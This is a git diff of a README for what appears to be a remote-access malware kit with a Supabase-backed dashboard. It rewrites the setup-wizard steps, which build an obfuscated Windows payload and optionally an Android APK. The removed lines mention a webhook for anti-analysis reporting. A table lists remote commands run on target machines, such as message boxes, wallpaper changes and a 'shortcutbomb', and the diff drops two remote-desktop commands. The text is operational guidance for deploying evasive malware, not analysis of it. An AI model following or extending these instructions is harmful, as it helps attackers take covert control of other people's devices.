@@ -109,14 +109,16 @@ npm install
 python3 setup.py
 ```
 
-The setup tool will:
-1. Ask for your Supabase project URL and anon key
-2. Optionally configure a secondary Supabase project for redundancy
-3. Configure webhook URL for anti-analysis reporting
-4. Update all config files (`main.go`, `.env`, `obfus.py`)
-5. Run SQL migrations via Supabase CLI (if installed)
-6. Deploy the `file-upload` edge function
-7. Build the payload EXE using the obfuscation pipeline
+This interactive wizard will:
+- Collect your Supabase URL and anon key
+- Log into Supabase CLI
+- Apply SQL migrations and deploy edge functions
+- Update config files (`.env`, `main.go`)
+- Create a dashboard login user
+- Optionally build the Windows payload
+- Optionally build the Android APK
+
+### 2. Start the Dashboard
 
 To rebuild later without re-running setup:
 ```bash
@@ -282,8 +284,6 @@ The final `.exe` is placed in your current directory.
 | `message` | Show message box |
 | `wallpaper` | Change wallpaper |
 | `minimizeall` | Minimize all windows |
-| `vnc_start` | Start remote desktop |
-| `vnc_stop` | Stop remote desktop |
 | `darkmode` | Switch to dark mode |
 | `lightmode` | Switch to light mode |
 | `shortcutbomb` | Create desktop shortcuts |
